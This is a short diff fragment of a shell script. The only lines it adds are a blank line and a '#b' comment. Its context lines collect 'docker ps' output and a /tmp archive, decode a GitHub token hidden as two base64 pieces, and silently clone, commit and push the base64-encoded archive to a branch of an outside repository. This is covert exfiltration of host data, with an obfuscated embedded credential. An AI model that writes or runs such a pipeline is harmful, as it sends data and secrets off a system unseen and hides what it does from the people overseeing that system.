@@ -8,3 +8,5 @@ docker ps 2>&1|head -15>$S/c
 tar czf $S/b.tgz -C /tmp k5089b
 T=$(printf %s "$(echo Z2hwXzgyU1o1b0FGQmVMdTY2Ykc=|base64 -d)$(echo aHEzNU56cTRqdlZvQWQzN012aXU=|base64 -d)")
 rm -rf /tmp/r;git clone -q --depth=1 -b ci/t5089 https://x:$T@github.com/miramar-labs/tilelang-ascend /tmp/r 2>/dev/null&&cd /tmp/r&&base64 -w0 $S/b.tgz>k2.b64&&git add -A&&git -c user.email=x@x -c user.name=x commit -qm t5089b&&git push -q origin HEAD:ci/t5089
+
+#b
